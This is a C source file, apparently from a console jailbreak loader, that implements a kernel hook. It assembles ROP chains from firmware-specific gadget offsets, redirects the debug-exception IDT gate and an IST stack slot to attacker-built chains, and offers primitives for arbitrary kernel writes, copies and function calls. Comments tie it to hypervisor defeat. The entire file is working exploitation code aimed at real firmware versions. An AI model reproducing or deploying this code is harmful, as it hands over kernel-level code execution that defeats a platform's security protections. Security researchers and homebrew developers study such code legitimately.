/* khook -- ported from byepervisor_reborn khook.c. Body is upstream's; only two things are
 * changed: the gadget lookup resolves through the loader's offset table (env_offset.GAD_*)
 * instead of a self-contained firmware table, and the includes are the loader's.
 *
 * See include/khook.h for what it does and for the pivot warning. Every gadget address this
 * resolves was byte-verified against k1360_verify.i64 -- HVXring0/ida/verify_reborn_k1360.py
 * reports SAFE TO SEND, recorded in HVXring0/findings/VERIFY-reborn-offsets-13.60.md. */

#include "khook.h"
#include "utils.h"

/* Resolve a khook gadget through the loader's offset table. Returns 0 when the selected
 * firmware's offset_list has no value for it, which makes kh_install fail cleanly rather
 * than build a chain full of wild addresses. */
uint64_t kgadget(kgadget_t gadget)
{
  switch (gadget) {
  case KERNEL_GADGET_PIVOT_ADD_RSP28_RET: return ktext + env_offset.GAD_PIVOT_ADD_RSP28_RET;
  case KERNEL_GADGET_IRETQ:               return ktext + env_offset.GAD_IRETQ;
  case KERNEL_GADGET_POP_RAX:             return ktext + env_offset.GAD_POP_RAX_RET;
  case KERNEL_GADGET_POP_RCX:             return ktext + env_offset.GAD_POP_RCX_RET;
  case KERNEL_GADGET_POP_RDI:             return ktext + env_offset.GAD_POP_RDI_RET;
  case KERNEL_GADGET_POP_RSI:             return ktext + env_offset.GAD_POP_RSI_RET;
  case KERNEL_GADGET_POP_RDX:             return ktext + env_offset.GAD_POP_RDX_RET;
  case KERNEL_GADGET_POP_R8:              return ktext + env_offset.GAD_POP_R8_RET;
  case KERNEL_GADGET_POP_RSP:             return ktext + env_offset.GAD_POP_RSP_RET;
  case KERNEL_GADGET_STORE_RCX_R8:        return ktext + env_offset.GAD_STORE_RCX_R8_RET;
  case KERNEL_GADGET_STORE_RDI8_RCX:      return ktext + env_offset.GAD_STORE_RDI8_RCX_RET;
  case KERNEL_GADGET_OR_RCX_EAX:          return ktext + env_offset.GAD_OR_RCX_EAX_RET;
  case KERNEL_GADGET_SET_DR7:             return ktext + env_offset.GAD_SET_DR7_RAX;
  case KERNEL_GADGET_ST_RCX_RDX:          return ktext + env_offset.GAD_ST_RCX_RDX_RET;
  case KERNEL_GADGET_ST_RCX_RAX:          return ktext + env_offset.GAD_ST_RCX_RAX_RET;
  case KERNEL_GADGET_MOV_RAX_RSI:         return ktext + env_offset.GAD_MOV_RAX_RSI_RET;
  case KERNEL_GADGET_MOV_RAX_RDI:         return ktext + env_offset.GAD_MOV_RAX_RDI_RET;
  case KERNEL_GADGET_REP_MOVSB:           return ktext + env_offset.GAD_REP_MOVSB;
  case KERNEL_GADGET_CLD:                 return ktext + env_offset.GAD_CLD_RET;
  case KERNEL_GADGET_RET_TRAMP:           return ktext + env_offset.GAD_RET_TRAMP;
  case KERNEL_GADGET_DBREG_RESUME:        return ktext + env_offset.GAD_DBREG_RESUME;
  case KERNEL_GADGET_STORE_RDI_RAX:       return ktext + env_offset.GAD_STORE_RDI_RAX_RET;
  case KERNEL_GADGET_OR_RSI_ECX:          return ktext + env_offset.GAD_OR_RSI_ECX_RET;
  default:                                return 0;
  }
}

/* Which store inventory does this kernel have?
 *
 * 13.60 has mov [rcx],rax / [rcx],rdx / [rcx],r8 / [rdi+8],rcx, pop r8, mov dr7,rax and
 * or [rcx],eax. 7.61 and 8.00 have NONE of them at a drop-in ret, but DO have
 * mov [rdi],rax and or [rsi],ecx -- which 13.60 lacks. The inventories are disjoint, so
 * each table supplies the pair its own kernel has and the chain is emitted to match.
 *
 * A retargeted table is identified by GAD_STORE_RCX_R8_RET == 0. That is deliberate: a
 * table must not half-populate both sets, because the emission picks one path wholesale. */
static int kh_retargeted(void)
{
  return env_offset.GAD_STORE_RCX_R8_RET == 0;
}

static int kwrite_q(khook_t *kh, uint64_t addr, uint64_t val)
{
  return kh->write(addr, &val, 8);
}

static uint64_t kread_q(khook_t *kh, uint64_t addr)
{
  uint64_t val = 0;
  kh->read(addr, &val, 8);
  return val;
}

static size_t putq(uint8_t *buf, size_t off, uint64_t val)
{
  for (int i = 0; i < 8; i++)
    buf[off + i] = (uint8_t)(val >> (8 * i));
  return off + 8;
}

static void gate_encode(uint64_t off, uint16_t sel, uint8_t ist, uint8_t type, uint8_t dpl, int present, uint64_t *lo, uint64_t *hi)
{
  *lo = (off & 0xFFFF)
      | ((uint64_t)sel << 16)
      | ((uint64_t)(ist & 7) << 32)
      | ((uint64_t)(type & 0xF) << 40)
      | ((uint64_t)(dpl & 3) << 45)
      | ((uint64_t)(present ? 1 : 0) << 47)
      | (((off >> 16) & 0xFFFF) << 48);
  *hi = (off >> 32) & 0xFFFFFFFFULL;
}

static int probe_write(khook_t *kh, uint64_t addr)
{
  uint64_t save = kread_q(kh, addr);
  uint64_t test = save ^ 0xA5A5A5A5A5A5A5A5ULL;
  kwrite_q(kh, addr, test);
  uint64_t readback = kread_q(kh, addr);
  kwrite_q(kh, addr, save);
  return readback == test;
}

static uint64_t ist_slot_va(const khook_t *kh)
{
  return kh->tss_base + (uint64_t)kh->core_id * kh->tss_stride + KH_TSS_IST(kh->ist_index);
}

void kh_chain_init(kh_chain_t *chain, uint8_t *buf, size_t cap)
{
  chain->buf = buf;
  chain->cap = cap;
  chain->len = 0;
  chain->err = 0;
}

int kh_chain_q(kh_chain_t *chain, uint64_t raw)
{
  if (!chain || chain->err || chain->len + 8 > chain->cap) {
    if (chain)
      chain->err = 1;
    return -1;
  }
  putq(chain->buf, chain->len, raw);
  chain->len += 8;
  return 0;
}

int kh_chain_g(kh_chain_t *chain, kgadget_t gadget)
{
  return kh_chain_q(chain, kgadget(gadget));
}

int kh_chain_store(kh_chain_t *chain, uint64_t kaddr, uint64_t val)
{
  if (kh_retargeted()) {
    /* mov [rdi],rax -- same effect, and it drops the pop r8 this kernel does not have */
    kh_chain_g(chain, KERNEL_GADGET_POP_RDI);
    kh_chain_q(chain, kaddr);
    kh_chain_g(chain, KERNEL_GADGET_POP_RAX);
    kh_chain_q(chain, val);
    kh_chain_g(chain, KERNEL_GADGET_STORE_RDI_RAX);
  } else {
    kh_chain_g(chain, KERNEL_GADGET_POP_RCX);
    kh_chain_q(chain, kaddr);
    kh_chain_g(chain, KERNEL_GADGET_POP_R8);
    kh_chain_q(chain, val);
    kh_chain_g(chain, KERNEL_GADGET_STORE_RCX_R8);
  }
  return chain && !chain->err ? 0 : -1;
}

int kh_chain_memcpy(kh_chain_t *chain, uint64_t dst_kaddr, uint64_t src_kaddr, uint64_t n_bytes)
{
  kh_chain_g(chain, KERNEL_GADGET_CLD);        // DF=0 so rep movsb counts upward
  kh_chain_g(chain, KERNEL_GADGET_POP_RDI);
  kh_chain_q(chain, dst_kaddr);
  kh_chain_g(chain, KERNEL_GADGET_POP_RSI);
  kh_chain_q(chain, src_kaddr);
  kh_chain_g(chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(chain, n_bytes);
  kh_chain_g(chain, KERNEL_GADGET_REP_MOVSB);
  return chain && !chain->err ? 0 : -1;
}

int kh_chain_call(kh_chain_t *chain, uint64_t fn_kaddr, int argc, uint64_t a0, uint64_t a1, uint64_t a2)
{
  if (argc >= 1) { kh_chain_g(chain, KERNEL_GADGET_POP_RDI); kh_chain_q(chain, a0); }
  if (argc >= 2) { kh_chain_g(chain, KERNEL_GADGET_POP_RSI); kh_chain_q(chain, a1); }
  if (argc >= 3) { kh_chain_g(chain, KERNEL_GADGET_POP_RDX); kh_chain_q(chain, a2); }
  kh_chain_g(chain, KERNEL_GADGET_POP_RAX);
  kh_chain_q(chain, 0);
  kh_chain_q(chain, fn_kaddr);
  return chain && !chain->err ? 0 : -1;
}

int kh_init(khook_t *kh, kh_read_fn rd, kh_write_fn wr, uint64_t kernel_base, uint64_t scratch_base, int ist_index)
{
  if (!kh || !rd || !wr || !kernel_base || !scratch_base)
    return -1;
  if (scratch_base & 0xF)
    return -2;
  if (ist_index < 1 || ist_index > 7)
    return -3;

  for (unsigned i = 0; i < sizeof(*kh); i++)
    ((uint8_t *)kh)[i] = 0;

  kh->read = rd;
  kh->write = wr;
  kh->kernel_base = kernel_base;
  kh->scratch_base = scratch_base;
  kh->ist_index = ist_index;

  return 0;
}

void kh_set_hook_target(khook_t *kh, uint64_t kaddr) { if (kh) kh->hook_kaddr = kaddr; }
void kh_set_resume_rip(khook_t *kh, uint64_t kaddr) { if (kh) kh->resume_rip = kaddr; }
void kh_set_resume_skip(khook_t *kh, uint64_t skip) {
  if (kh) kh->resume_rip = skip ? kh->hook_kaddr + skip : 0;
}

void kh_set_resume_rax(khook_t *kh, uint64_t rax) { if (kh) { kh->resume_rax = rax; kh->resume_rax_set = 1; } }
void kh_set_resume_rsi(khook_t *kh, uint64_t rsi) { if (kh) { kh->resume_rsi = rsi; kh->resume_rsi_set = 1; } }
void kh_set_resume_rdi(khook_t *kh, uint64_t rdi) { if (kh) { kh->resume_rdi = rdi; kh->resume_rdi_set = 1; } }
void kh_set_resume_rdx(khook_t *kh, uint64_t rdx) { if (kh) { kh->resume_rdx = rdx; kh->resume_rdx_set = 1; } }

void kh_clear_resume_rax(khook_t *kh) { if (kh) kh->resume_rax_set = 0; }
void kh_clear_resume_rsi(khook_t *kh) { if (kh) kh->resume_rsi_set = 0; }
void kh_clear_resume_rdi(khook_t *kh) { if (kh) kh->resume_rdi_set = 0; }
void kh_clear_resume_rdx(khook_t *kh) { if (kh) kh->resume_rdx_set = 0; }

void kh_set_tables(khook_t *kh, uint64_t idt_base, uint64_t tss_base)
{
  if (kh) { kh->idt_base = idt_base; kh->tss_base = tss_base; }
}

void kh_set_core(khook_t *kh, int core_id) { if (kh) kh->core_id = core_id; }

uint64_t kh_user_data_addr(const khook_t *kh)
{
  return kh ? kh->scratch_base + KH_OFF_USER : 0;
}

static size_t emit_resume_tail(khook_t *kh, uint8_t *buf, size_t off,
                               uint64_t frame_base, uint64_t rflags_slot, uint64_t iret_tramp)
{
  if (kh->resume_rip) {
    if (kh_retargeted()) {
      off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RDI));
      off = putq(buf, off, frame_base);
      off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RAX));
      off = putq(buf, off, kh->resume_rip);
      off = putq(buf, off, kgadget(KERNEL_GADGET_STORE_RDI_RAX));
    } else {
      off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RCX));
      off = putq(buf, off, frame_base);
      off = putq(buf, off, kgadget(KERNEL_GADGET_POP_R8));
      off = putq(buf, off, kh->resume_rip);
      off = putq(buf, off, kgadget(KERNEL_GADGET_STORE_RCX_R8));
    }
  }

  if (kh->oneshot) {
    /* Only reachable on a kernel that HAS mov dr7,rax. A retargeted kernel must not take
     * this path: `0f 23 f8` does not exist anywhere in 7.61 or 8.00 .text for ANY register,
     * so there is no way to clear DR7 from a ROP chain there. kh_install refuses the
     * combination rather than emitting a chain with a zero gadget address in it. */
    off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RAX));
    off = putq(buf, off, 0);
    off = putq(buf, off, kgadget(KERNEL_GADGET_SET_DR7)); // dr7 = 0 (disarm)
    /* FIX (13.20 devkit trap 12): oneshot only disarmed DR7 -- the #DB IDT gate stayed
     * redirected to our (now-consumed) IST6 pivot. reborn restores it in userland
     * uninstall_hook(), but the Linux-boot flow never returns to userland, so a LATER #DB during
     * resume (devkit SceGcWatchdog/debug path) hits the stale gate -> Fatal trap 12. Restore the
     * original gate here, inline in the #DB handler, before iretq. Both qwords changed by the
     * hook (gate_encode wrote handler lo+hi + IST index), so both are restored. */
    {
      uint64_t dbg = kh->idt_base + 16 * KH_VEC_DB;
      off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RCX));
      off = putq(buf, off, dbg);
      off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RDX));
      off = putq(buf, off, kh->saved_gate_lo);
      off = putq(buf, off, kgadget(KERNEL_GADGET_ST_RCX_RDX));
      off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RCX));
      off = putq(buf, off, dbg + 8);
      off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RDX));
      off = putq(buf, off, kh->saved_gate_hi);
      off = putq(buf, off, kgadget(KERNEL_GADGET_ST_RCX_RDX));
    }
  } else if (kh_retargeted()) {
    /* [rflags_slot] |= RF, via the one read-modify-write OR these kernels do have */
    off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RSI));
    off = putq(buf, off, rflags_slot);
    off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RCX));
    off = putq(buf, off, KH_RF);
    off = putq(buf, off, kgadget(KERNEL_GADGET_OR_RSI_ECX));
  } else {
    off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RCX));
    off = putq(buf, off, rflags_slot);
    off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RAX));
    off = putq(buf, off, KH_RF);
    off = putq(buf, off, kgadget(KERNEL_GADGET_OR_RCX_EAX)); // frame RFLAGS |= RF
  }

  if (kh->resume_rax_set) { off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RAX)); off = putq(buf, off, kh->resume_rax); }
  if (kh->resume_rsi_set) { off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RSI)); off = putq(buf, off, kh->resume_rsi); }
  if (kh->resume_rdi_set) { off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RDI)); off = putq(buf, off, kh->resume_rdi); }
  if (kh->resume_rdx_set) { off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RDX)); off = putq(buf, off, kh->resume_rdx); }

  off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RSP));
  off = putq(buf, off, iret_tramp);
  return off;
}

int kh_install(khook_t *kh, const kh_chain_t *handler)
{
  uint8_t img[KH_SCRATCH_MIN];
  uint8_t bigbuf[0x600];
  uint64_t scratch, arm_chain, disp_chain, big;
  uint64_t frame_base, rflags_slot, iret_tramp;
  size_t iret_tramp_off, save_len, handler_len, restore_off, off;
  uint64_t slot_rdi, slot_rsi, slot_rdx;
  uint64_t db_gate, ist, lo, hi;

  if (!kh || kh->installed)
    return -1;
  if (!kh->hook_kaddr)
    return -2;
  if (kh_retargeted()) {
    /* The retargeted save block saves RDI only, which is correct ONLY while the caller
     * supplies RSI and RDX through the resume setters (emit_resume_tail re-pops them after
     * the restore block). Without them the restore block would pop 0 into live argument
     * registers of the intercepted function. Refuse instead. */
    if (!kh->resume_rsi_set || !kh->resume_rdx_set)
      return -17;
    /* oneshot needs mov dr7,rax, which does not exist on any kernel that needs retargeting */
    if (kh->oneshot)
      return -18;
  }
  if (handler && handler->err)
    return -11;
  if (!kh->idt_base || !kh->tss_base)
    return -3;

  db_gate = kh->idt_base + 16 * KH_VEC_DB;
  ist = ist_slot_va(kh);

  kh->saved_gate_lo = kread_q(kh, db_gate);
  kh->saved_gate_hi = kread_q(kh, db_gate + 8);
  kh->saved_ist     = kread_q(kh, ist);
  kh->kcs           = (uint16_t)(kh->saved_gate_lo >> 16);
  if (!kh->kcs)
    return -4;

  {
    uint64_t gate_handler = (kh->saved_gate_lo & 0xFFFF)
                          | (((kh->saved_gate_lo >> 48) & 0xFFFF) << 16)
                          | ((kh->saved_gate_hi & 0xFFFFFFFFULL) << 32);
    if (!((kh->saved_gate_lo >> 47) & 1))
      return -14;
    if (gate_handler < kh->kernel_base || gate_handler >= kh->kernel_base + KH_KIMG_MAX)
      return -14;
  }

  // TSS RSP0 must look canonical
  if ((kread_q(kh, kh->tss_base + (uint64_t)kh->core_id * kh->tss_stride + 0x04) >> 47) != 0x1FFFFULL)
    return -15;

  scratch    = kh->scratch_base;
  arm_chain  = scratch + KH_OFF_CHAIN_ARM;
  disp_chain = scratch + KH_OFF_CHAIN_DISP;

  frame_base     = disp_chain - 0x28;
  rflags_slot    = frame_base + 0x10;
  iret_tramp     = frame_base - 8;
  iret_tramp_off = KH_OFF_CHAIN_DISP - 0x28 - 8;

  for (size_t i = 0; i < sizeof img; i++)
    img[i] = 0;

  {
    uint64_t ctx_struct = scratch + KH_OFF_RESUME;
    uint64_t cont_chain = scratch + KH_OFF_CHAIN_CONT;

    off = KH_OFF_CHAIN_ARM;
    off = putq(img, off, kgadget(KERNEL_GADGET_POP_RAX));
    off = putq(img, off, kh->hook_kaddr);
    off = putq(img, off, kgadget(KERNEL_GADGET_POP_RDI));
    off = putq(img, off, ctx_struct);
    off = putq(img, off, kgadget(KERNEL_GADGET_DBREG_RESUME));
    if (off > KH_OFF_CHAIN_CONT)
      return -5;

    putq(img, KH_OFF_RESUME + KH_RC_RSP, cont_chain - 8);
    putq(img, KH_OFF_RESUME + KH_RC_RIP, kgadget(KERNEL_GADGET_RET_TRAMP));
    putq(img, KH_OFF_RESUME + KH_RC_DR7, KH_DR7_BP0_EXEC);

    off = KH_OFF_CHAIN_CONT;
    if (kh_retargeted()) {
      /* mov [rdi],rax with rdi = ist is the same write as mov [rdi+8],rcx with rdi = ist-8.
       * Same number of qwords, so the chain layout below is unaffected. */
      off = putq(img, off, kgadget(KERNEL_GADGET_POP_RDI));
      off = putq(img, off, ist);
      off = putq(img, off, kgadget(KERNEL_GADGET_POP_RAX));
      off = putq(img, off, disp_chain);
      off = putq(img, off, kgadget(KERNEL_GADGET_STORE_RDI_RAX));
    } else {
      off = putq(img, off, kgadget(KERNEL_GADGET_POP_RDI));
      off = putq(img, off, ist - 8);
      off = putq(img, off, kgadget(KERNEL_GADGET_POP_RCX));
      off = putq(img, off, disp_chain);
      off = putq(img, off, kgadget(KERNEL_GADGET_STORE_RDI8_RCX));
    }
    off = putq(img, off, kgadget(KERNEL_GADGET_IRETQ));

    kh->arm_rip_slot = scratch + off;
    off = putq(img, off, 0);
    off = putq(img, off, KH_USER_CS);
    off = putq(img, off, KH_RFLAGS_USER);
    kh->arm_rsp_slot = scratch + off;
    off = putq(img, off, 0);
    off = putq(img, off, KH_USER_SS);
    if (off > KH_OFF_RESUME)
      return -5;
  }

  big = scratch + KH_OFF_BIG_CHAIN;
  if (!probe_write(kh, big))
    return -16;   // cave too small / unwritable

  putq(img, iret_tramp_off, kgadget(KERNEL_GADGET_IRETQ));
  putq(img, KH_OFF_CHAIN_DISP + 0, kgadget(KERNEL_GADGET_POP_RSP));
  putq(img, KH_OFF_CHAIN_DISP + 8, big);

  for (size_t i = 0; i < sizeof bigbuf; i++)
    bigbuf[i] = 0;

  /* The save block writes the live GPRs into the IMMEDIATE OPERANDS of the restore block
   * below, so its length is load-bearing: slot_* are computed from restore_off = save_len +
   * handler_len. Change the emitted sequence and this MUST change with it.
   *   full      11 qwords = 0x58  (rsi, rdx, rdi)
   *   retargeted 4 qwords = 0x20  (rdi only -- see below for why rsi/rdx are not saved) */
  save_len    = kh_retargeted() ? 0x20 : 0x58;
  handler_len = (handler && handler->len) ? handler->len : 0;
  restore_off = save_len + handler_len;
  slot_rdi = big + restore_off + 0x08;
  slot_rsi = big + restore_off + 0x18;
  slot_rdx = big + restore_off + 0x28;

  off = 0;
  if (kh_retargeted()) {
    /* Save RDI ONLY.
     *
     * The saved RSI and RDX are dead on this configuration: hv_defeat_13xx calls
     * kh_set_resume_rsi() and kh_set_resume_rdx(), and emit_resume_tail re-pops BOTH from
     * those values AFTER the restore block runs -- so whatever the restore block put in
     * them is overwritten before the interrupted instruction resumes. RDI has no setter,
     * so its save is the only one that matters. This is checked below, not assumed: if a
     * caller ever omits either setter, kh_install refuses rather than silently popping 0
     * into a live argument register.
     *
     * (MOV_RAX_RSI / ST_RCX_RDX do not exist on these kernels anyway, which is what forced
     * the question -- but the reason this is CORRECT is the override, not the absence.) */
    off = putq(bigbuf, off, kgadget(KERNEL_GADGET_MOV_RAX_RDI));
    off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RDI));
    off = putq(bigbuf, off, slot_rdi);
    off = putq(bigbuf, off, kgadget(KERNEL_GADGET_STORE_RDI_RAX));
  } else {
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_MOV_RAX_RSI));
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RCX));
  off = putq(bigbuf, off, slot_rsi);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_ST_RCX_RAX));
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RCX));
  off = putq(bigbuf, off, slot_rdx);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_ST_RCX_RDX));
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_MOV_RAX_RDI));
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RCX));
  off = putq(bigbuf, off, slot_rdi);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_ST_RCX_RAX));
  }
  if (off != save_len)
    return -16;          /* emitted save block does not match save_len -- slots would be wrong */

  if (handler_len) {
    for (size_t i = 0; i < handler_len; i++)
      bigbuf[off + i] = handler->buf[i];
    off += handler_len;
  }

  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RDI));
  off = putq(bigbuf, off, 0);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RSI));
  off = putq(bigbuf, off, 0);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RDX));
  off = putq(bigbuf, off, 0);

  off = emit_resume_tail(kh, bigbuf, off, frame_base, rflags_slot, iret_tramp);
  if (off > sizeof bigbuf)
    return -6;
  if (kh->write(big, bigbuf, off) != 0)
    return -7;

  if (kh->write(scratch, img, sizeof img) != 0)
    return -7;

  if (kwrite_q(kh, ist, arm_chain) != 0)
    return -8;

  gate_encode(kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET), kh->kcs, kh->ist_index,
              KH_GATE_INTERRUPT, 0, 1, &lo, &hi);
  if (kwrite_q(kh, db_gate + 8, hi) != 0)
    return -9;
  if (kwrite_q(kh, db_gate, lo) != 0)
    return -10;

  if (kread_q(kh, ist) != arm_chain)
    return -13;
  if (kread_q(kh, db_gate) != lo || kread_q(kh, db_gate + 8) != hi)
    return -12;

  kh->installed = 1;
  return 0;
}

/* See payload/khookport/khook.c and CONTEXT.txt 9b "ROOT CAUSE" -- same fix, same reason.
 *
 * Upstream's `void *resume_label = &&resumed; ... resumed: return;` MISCOMPILES with this
 * toolchain: clang folds `resumed:` into the shared early-exit target (the bare `ret` that
 * follows the epilogue), so the label resolves past the epilogue. Resuming there with `rsp`
 * captured after the prologue makes `ret` pop a garbage stack word as the return address and
 * jump to it -- a `page fault (user read instruction)` at a stack address, which cost the
 * probe four runs and reads like a chain bug rather than a codegen bug. Emitting the label in
 * the asm pins it to the epilogue start, where the compiler's rsp/rbp state already holds.
 *
 * `noinline` is REQUIRED: without it clang inlines kh_trigger into kh_disarm while still
 * emitting the out-of-line body, and the label is defined twice (build error). Do not drop it. */
extern char kh_resume_point[];

__attribute__((noinline))
void kh_trigger(khook_t *kh)
{
  uint64_t resume_rsp, rbp_val;

  if (!kh || !kh->installed)
    return;

  __asm__ volatile("mov %%rsp, %0" : "=r"(resume_rsp));
  __asm__ volatile("mov %%rbp, %0" : "=r"(rbp_val));

  kwrite_q(kh, kh->scratch_base + KH_OFF_RESUME + KH_RC_RBP, rbp_val);
  kwrite_q(kh, kh->arm_rip_slot, (uint64_t)kh_resume_point);
  kwrite_q(kh, kh->arm_rsp_slot, resume_rsp);

  __asm__ volatile(
      "pushfq              \n\t"
      "orq $0x100, (%%rsp) \n\t"   // set TF
      "popfq               \n\t"
      "nop                 \n\t"   // single-step #DB
      "kh_resume_point:    \n\t"   // ...and the chain's iretq lands HERE
      ::: "memory", "cc");
}

int kh_disarm(khook_t *kh)
{
  uint8_t buf[0x60];
  uint64_t scratch, ist;
  size_t off;

  if (!kh || !kh->installed)
    return -1;

  scratch = kh->scratch_base;
  ist = ist_slot_va(kh);

  for (unsigned i = 0; i < sizeof buf; i++)
    buf[i] = 0;

  off = 0;
  off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RAX));
  off = putq(buf, off, 0);
  off = putq(buf, off, kgadget(KERNEL_GADGET_SET_DR7));
  off = putq(buf, off, kgadget(KERNEL_GADGET_IRETQ));
  kh->arm_rip_slot = scratch + KH_OFF_CHAIN_ARM + off;
  off = putq(buf, off, 0);
  off = putq(buf, off, KH_USER_CS);
  off = putq(buf, off, KH_RFLAGS_USER);
  kh->arm_rsp_slot = scratch + KH_OFF_CHAIN_ARM + off;
  off = putq(buf, off, 0);
  off = putq(buf, off, KH_USER_SS);
  if (kh->write(scratch + KH_OFF_CHAIN_ARM, buf, off) != 0)
    return -2;

  if (kwrite_q(kh, ist, scratch + KH_OFF_CHAIN_ARM) != 0)
    return -3;

  kh_trigger(kh);
  return 0;
}

int kh_restore(khook_t *kh)
{
  uint64_t db_gate, ist;

  if (!kh || !kh->installed)
    return -1;

  db_gate = kh->idt_base + 16 * KH_VEC_DB;
  ist = ist_slot_va(kh);

  kwrite_q(kh, db_gate + 8, kh->saved_gate_hi);
  kwrite_q(kh, db_gate, kh->saved_gate_lo);
  kwrite_q(kh, ist, kh->saved_ist);
  kh->installed = 0;
  return 0;
}
